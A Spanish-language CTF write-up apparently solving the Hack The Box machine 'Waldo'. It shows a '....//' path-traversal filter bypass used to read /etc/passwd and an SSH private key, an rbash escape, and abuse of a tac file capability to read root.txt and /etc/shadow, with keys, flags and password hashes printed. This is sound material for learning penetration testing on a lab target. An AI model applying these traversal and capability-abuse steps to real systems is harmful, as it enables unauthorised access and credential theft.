---
layout: single
title: Waldo - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina waldo de la plataforma de Hackthebox donde mediante un directory path traversal que tendremos que hacer un pequeño bypass lograremos ver la clave privada de un usuario para conectarnos por SSH al igual que dentro de la maquina nos convertiremos en otro usuario usando otra clave ya que tendremos que migrar de usuario para poder continuar para la escalada de privilegios tendremos que abusar de una capabilitie con la cual podemos leer archivos y vamos a poder leer la root.txt"
date: 2023-07-24
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-waldo/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Restricted Shell Bypass
  - Abusing Capabilities
  - Filter Bypass
  - PATH Traversal
---

<p align="center">
<img src="/assets/images/htb-writeup-waldo/banner.png">
</p>

```bash
❯ ping -c 1 10.129.156.20
PING 10.129.156.20 (10.129.156.20) 56(84) bytes of data.
64 bytes from 10.129.156.20: icmp_seq=1 ttl=63 time=151 ms

--- 10.129.156.20 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 150.896/150.896/150.896/0.000 ms
❯ whichSystem.py 10.129.156.20

10.129.156.20 (ttl -> 63): Linux
```

## PortScan

```bash
❯ nmap -sCV -p22,80 10.129.156.20 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-24 08:14 CST
Nmap scan report for 10.129.156.20
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 c4ff81aaacdf669edae1c87800ab329e (RSA)
|   256 b3e7546a16bdc9291f4a8ccd4c012427 (ECDSA)
|_  256 3864ac575644d569de74a888dca0b4fd (ED25519)
80/tcp open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: List Manager
|_Requested resource was /list.html
```

## Enumeracion

Estas son las tecnologías que están corriendo en el puerto **80**

```ruby
❯ whatweb http://10.129.156.20
http://10.129.156.20 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.12.2], IP[10.129.156.20], PHP[7.1.16], RedirectLocation[/list.html], X-Powered-By[PHP/7.1.16], nginx[1.12.2]
http://10.129.156.20/list.html [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.12.2], IP[10.129.156.20], Script, Title[List Manager], nginx[1.12.2]
```

Esta es la pagina **web**

![](/assets/images/htb-writeup-waldo/web1.png)

Vemos que nos dicen que es un **List Manager** y hay solo 2 listas y nos dan la opción de borrarlas si presionamos en **delete** vemos que si se borra 

![](/assets/images/htb-writeup-waldo/web2.png)

Si presionamos en **list2** vemos que como tal tiene contenido 

![](/assets/images/htb-writeup-waldo/web3.png)

Si presionamos en la **list** también podemos editarla

![](/assets/images/htb-writeup-waldo/web4.png)

Si añadimos una nueva lista y la editamos para poner `<h1>hola</h1>` vemos que si nos interpreta las etiquetas

![](/assets/images/htb-writeup-waldo/web5.png)

Como se esta interpretando las etiquetas lo que podemos hacer es hacer una prueba para ver si recibimos peticiones

```bash
❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Podemos poner esto `<script src="http://10.10.14.86/zi.js"></script>` nos es necesario que el archivo exista solo es para ver si recibimos una petición

Pero bueno si esperamos como tal no nos llega nada a nuestro servidor de **python3** a si que poca cosa vamos a hacer con esto por el momento algo que podemos probar es hacer **fuzzing** para ver si hay mas rutas

```bash
❯ wfuzz -c --hc=404 --hl=0 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt http://10.129.156.20/list.html/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.156.20/list.html/FUZZ
Total requests: 87664

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================


Total time: 132.6277
Processed Requests: 87664
Filtered Requests: 87664
Requests/sec.: 660.9775
```

## Directory PATH Traversal 

Pero bueno como no encontramos nada vamos abrirnos el **Burpsuite** para capturar la petición en la ruta `http://10.129.256.20/list.html`

```bash
❯ burpsuite &>/dev/null & disown
[1] 31810
```

Y recibimos la petición

![](/assets/images/htb-writeup-waldo/web6.png)

Vemos que es una petición por **POST** ala ruta **dirRead.php** y hay un **path** que lo que lo mas probable es que se encargue de mostrar los archivos que están en un directorio vamos a enviar la petición y ver la respuesta

![](/assets/images/htb-writeup-waldo/web7.png)

Bueno como nos esta mostrando los puntos `.` `..` estamos en un directorio así que vamos a ir para atrás para ver si podemos ver el contenido 

Bueno si agregamos `../../` vemos que no funciona y los mas probable es que hay sanitizacion por detrás para no dejarnos hacer pero podemos aplicar un `Bypass` de esta forma `....//....//` si es que detecta que le estamos pasando `../../` tal vez no nos deje pero como lo estamos haciendo agregando otro `/` y otros 2 `..` si lo va a interpretar por que quedara así `../../` después de aplicar la sanitizacion

![](/assets/images/htb-writeup-waldo/web8.png)

Ahora si aplicamos ese `Bypass` vemos que si funciona

![](/assets/images/htb-writeup-waldo/web9.png)

Vamos ir varios directorios hacia atrás para llegar ala **raiz** y vemos que se esta usando `docker` así que los mas probable es que ganamos acceso a un contenedor

![](/assets/images/htb-writeup-waldo/web10.png)

Como vimos hay algunos archivos `php` que tiene diferentes funciones lo que podemos hacer capturar la petición con `Burpsuite` al momento de darle click a **list1** vemos que ahora se esta empleando `fileRead.php` y como tal este se encarga de leer los archivos así que con el **directory path traversal** podemos ir varios directorios hacia atrás y tratar de leer algún archivo como el **/etc/passwd**

![](/assets/images/htb-writeup-waldo/web11.png)

## Shell as nobody

Vemos que solo existe el directorio de `nobody` que es un usuario a nivel de sistema

![](/assets/images/htb-writeup-waldo/web12.png)

```bash
❯ curl -s -X POST "http://10.129.156.20/fileRead.php" -d 'file=./.list/....//....//....//....//....//....//etc/passwd' | jq '.["file"]' -r | grep "sh$"
root:x:0:0:root:/root:/bin/ash
operator:x:11:0:operator:/root:/bin/sh
postgres:x:70:70::/var/lib/postgresql:/bin/sh
nobody:x:65534:65534:nobody:/home/nobody:/bin/sh
```

Si vemos si tiene una `id_rsa` vemos que no la tiene pero hay otro archivo interesante

![](/assets/images/htb-writeup-waldo/web13.png)

Y vemos una **clave privada**

```bash
❯ curl -s -X POST "http://10.129.156.20/fileRead.php" -d 'file=./.list/....//....//....//....//....//....//home/nobody/.ssh/.monitor' | jq '.["file"]' -r
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl
mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f
87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS
dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN
o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V
vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU
vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6
pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5
8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q
1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7
VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS
dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO
v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr
xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY
qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI
yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1
/pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU
LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/
lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp
w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9
1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT
rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr
X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2
DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla
W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro=
-----END RSA PRIVATE KEY-----
```

Ahora nos conectamos después de darle privilegios `600` ala `id_rsa` `chmod 600 id_rsa`

```bash
❯ ssh -i id_rsa nobody@10.129.156.20
The authenticity of host '10.129.156.20 (10.129.156.20)' can't be established.
ECDSA key fingerprint is SHA256:S4nfJbcTY7WAdYp2v16xgnUj4MEIzqZ/jwbGI92FXEk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.156.20' (ECDSA) to the list of known hosts.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org>.
waldo:~$ 
```

## User flag

```bash
waldo:~$ cat user.txt 
1ce00d9bf732ded5653fd76eb17d20bc
waldo:~$ 
```

## Shell as monitor

Vemos que el puerto `8888` esta abierto

```bash
waldo:~$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      
tcp        0    316 10.129.156.20:8888      10.10.14.86:37532       ESTABLISHED 
tcp        0      0 :::80                   :::*                    LISTEN      
tcp        0      0 :::22                   :::*                    LISTEN      
tcp        0      0 :::8888                 :::*                    LISTEN      
waldo:~$ 
```

Estamos en la maquina victima y ademas nuestro **PATH** es muy pequeño así que vamos a exportar el de nosotros

```bash
waldo:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:50:56:96:4c:89 brd ff:ff:ff:ff:ff:ff
    inet 10.129.156.20/16 brd 10.129.255.255 scope global ens192
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN 
    link/ether 02:42:b5:02:92:c9 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
waldo:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
waldo:~$ 
waldo:~$ export PATH=/root/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/shar
e/games:/usr/local/sbin:/usr/sbin:/sbin:/opt/nvim-linux64/bin:/opt/i3lock-fancy:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bi
n:/sbin:/bin:/root/.fzf/bin
waldo:~$ echo $PATH
/root/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/opt/nvim-linux64/bin:/opt/i3lock-fancy:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/root/.fzf/bin
waldo:~$ 
```

Después de enumerar la maquina y no encontrar nada interesante si nos vamos a la `.ssh` vemos que en `authorized_keys` le pertenece a `monitor` 

```bash
waldo:~/.ssh$ cat authorized_keys ; echo
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgkfqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlRtJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbBVeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+arOD6NJOFJY4jBHvf monitor@waldo
waldo:~/.ssh$ 
```

# Escape restricted bash

Nos vamos a conectar a la propia maquina victima pero estamos en una `restricted bash`

```bash
waldo:~/.ssh$ ssh -i .monitor monitor@localhost
Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64
           &.                                                                  
          @@@,@@/ %                                                            
       #*/%@@@@/.&@@,                                                          
   @@@#@@#&@#&#&@@@,*%/                                                        
   /@@@&###########@@&*(*                                                      
 (@################%@@@@@.     /**                                             
 @@@@&#############%@@@@@@@@@@@@@@@@@@@@@@@@%((/                               
 %@@@@%##########&@@@....                 .#%#@@@@@@@#                         
 @@&%#########@@@@/                        */@@@%(((@@@%                       
    @@@#%@@%@@@,                       *&@@@&%(((#((((@@(                      
     /(@@@@@@@                     *&@@@@%((((((((((((#@@(                     
       %/#@@@/@ @#/@          ..@@@@%(((((((((((#((#@@@@@@@@@@@@&#,            
          %@*(@#%@.,       /@@@@&(((((((((((((((&@@@@@@&#######%%@@@@#    &    
        *@@@@@#        .&@@@#(((#(#((((((((#%@@@@@%###&@@@@@@@@@&%##&@@@@@@/   
       /@@          #@@@&#(((((((((((#((@@@@@%%%%@@@@%#########%&@@@@@@@@&     
      *@@      *%@@@@#((((((((((((((#@@@@@@@@@@%####%@@@@@@@@@@@@###&@@@@@@@&  
      %@/ .&%@@%#(((((((((((((((#@@@@@@@&#####%@@@%#############%@@@&%##&@@/   
      @@@@@@%(((((((((((##(((@@@@&%####%@@@%#####&@@@@@@@@@@@@@@@&##&@@@@@@@@@/
     @@@&(((#((((((((((((#@@@@@&@@@@######@@@###################&@@@&#####%@@* 
     @@#(((((((((((((#@@@@%&@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@
     *@@%((((((((#@@@@@@@%#&@@,,.,,.&@@@#####################%@@@@@@%######&@@.
       @@@#(#&@@@@@&##&@@@&#@@/,,,,,,,,@@@&######&@@@@@@@@&&%######%@@@@@@@@@@@
        @@@@@@&%&@@@%#&@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.*&@@%&@@@@@@&%#####%@@@@.
          .@@@###&@@@%%@(,,,%@&,.,,,,,,,,,,,,,.*&@@@@&(,*@&#@%%@@@@@@@@@@@@*   
            @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&@@@@(&@&@&@@@@(           
            .@@&##@@,,/@@@@&(.  .&@@@&,,,.&@@/         #@@%@@@@@&@@@/          
           *@@@@@&@@.*@@@          %@@@*,&@@            *@@@@@&.#/,@/          
          *@@&*#@@@@@@@&     #@(    .@@@@@@&    ,@@@,    @@@@@(,@/@@           
          *@@/@#.#@@@@@/    %@@@,   .@@&%@@@     &@&     @@*@@*(@@#            
           (@@/@,,@@&@@@            &@@,,(@@&          .@@%/@@,@@              
             /@@@*,@@,@@@*         @@@,,,,,@@@@.     *@@@%,@@**@#              
               %@@.%@&,(@@@@,  /&@@@@,,,,,,,%@@@@@@@@@@%,,*@@,#@,              
                ,@@,&@,,,,(@@@@@@@(,,,,,.,,,,,,,,**,,,,,,.*@/,&@               
                 &@,*@@.,,,,,..,,,,&@@%/**/@@*,,,,,&(.,,,.@@,,@@               
                 /@%,&@/,,,,/@%,,,,,*&@@@@@#.,,,,,.@@@(,,(@@@@@(               
                  @@*,@@,,,#@@@&*..,,,,,,,,,,,,/@@@@,*(,,&@/#*                 
                  *@@@@@(,,@*,%@@@@@@@&&#%@@@@@@@/,,,,,,,@@                    
                       @@*,,,,,,,,,.*/(//*,..,,,,,,,,,,,&@,                    
                        @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                     
                        &@&,,,,,,,,,,,,,,,,,,,,,,,,,,,,&@#                     
                         %@(,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                      
                         ,@@,,,,,,,,@@@&&&%&@,,,,,..,,@@,                      
                          *@@,,,,,,,.,****,..,,,,,,,,&@@                       
                           (@(,,,.,,,,,,,,,,,,,,.,,,/@@                        
                           .@@,,,,,,,,,,,,,...,,,,,,@@                         
                            ,@@@,,,,,,,,,,,,,,,,.(@@@                          
                              %@@@@&(,,,,*(#&@@@@@@,     
                              
                            Here's Waldo, where's root?
Last login: Tue Jul 24 08:09:03 2018 from 127.0.0.1
-rbash: alias: command not found
monitor@waldo:~$ 
```

Ahora tenemos que escapar nos vamos a enviar una `bash` antes 

```bash
waldo:~/.ssh$ ssh -i .monitor monitor@localhost bash
whoami
monitor
script /dev/null -c bash
Script started, file is /dev/null
monitor@waldo:~$ 
```

## Escalada de privilegios

Vamos a exportar otra vez nuestro **PATH**

```bash
monitor@waldo:~$ echo $PATH
/root/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/opt/nvim-linux64/bin:/opt/i3lock-fancy:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/root/.fzf/bin
monitor@waldo:~$ export TERM=xterm
```

Si enumeramos por `capabilities` vemos las siguientes `tac` es lo contrario de `cat`

```bash
monitor@waldo:/home/nobody$ getcap -r / 2>/dev/null
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
monitor@waldo:/home/nobody$ 
```

## root.txt

Y bueno como podemos ver archivos pues vamos a ver la `root.txt`

```bash
monitor@waldo:/home/nobody$ tac /root/root.txt
7f680a52657f6c1ee72752e7ab096955
```

Como `tac` te muestra las cosas de abajo hacia arriba podemos hacer esto para ver el contenido de la manera correcta y ver los `hashes` de los usuarios

```bash
monitor@waldo:/home/nobody$ tac /etc/shadow | tac
root:$6$tRIbOmog$v7fPb8FKIT0QryKrm7RstojMs.ZXi4xxHz2Uix9lsw52eWtsURc9dwWMOyt4Gpd6QLtVtDnU1NO5KE5gF48r8.:17654:0:99999:7:::
daemon:*:17653:0:99999:7:::
bin:*:17653:0:99999:7:::
sys:*:17653:0:99999:7:::
sync:*:17653:0:99999:7:::
games:*:17653:0:99999:7:::
man:*:17653:0:99999:7:::
lp:*:17653:0:99999:7:::
mail:*:17653:0:99999:7:::
news:*:17653:0:99999:7:::
uucp:*:17653:0:99999:7:::
proxy:*:17653:0:99999:7:::
www-data:*:17653:0:99999:7:::
backup:*:17653:0:99999:7:::
list:*:17653:0:99999:7:::
irc:*:17653:0:99999:7:::
gnats:*:17653:0:99999:7:::
nobody:*:17653:0:99999:7:::
systemd-timesync:*:17653:0:99999:7:::
systemd-network:*:17653:0:99999:7:::
systemd-resolve:*:17653:0:99999:7:::
systemd-bus-proxy:*:17653:0:99999:7:::
_apt:*:17653:0:99999:7:::
avahi-autoipd:*:17653:0:99999:7:::
messagebus:*:17653:0:99999:7:::
sshd:*:17653:0:99999:7:::
steve:$6$MmXo3me9$zPPUertAwnJYQM8GUya1rzCTKGr/AHtjSG2n3faSeupCCBjoaknUz2YUDStZtvUGWuXonFqXKZF8pXCkezJ.Q.:17653:0:99999:7:::
monitor:$6$IXQ7fATd$RsOewky58ltAbfdjYBHFk9/q5bRcUplLnM9ZHKknVB46smsKn4msCOXDpyYU6xw43rGqJl5fG3sMmEaKhJAJt/:17654:0:99999:7:::
app-dev:$6$RQ4VUGfn$6WYq54MO9AvNFMW.FCRekOBPYJXuI02AqR5lYlwN5/eylTlTWmHlLLvJ4FDp4Nt0A/AX2b3zdrvyEfwf8vSh3/:17654:0:99999:7:::
monitor@waldo:/home/nobody$
```


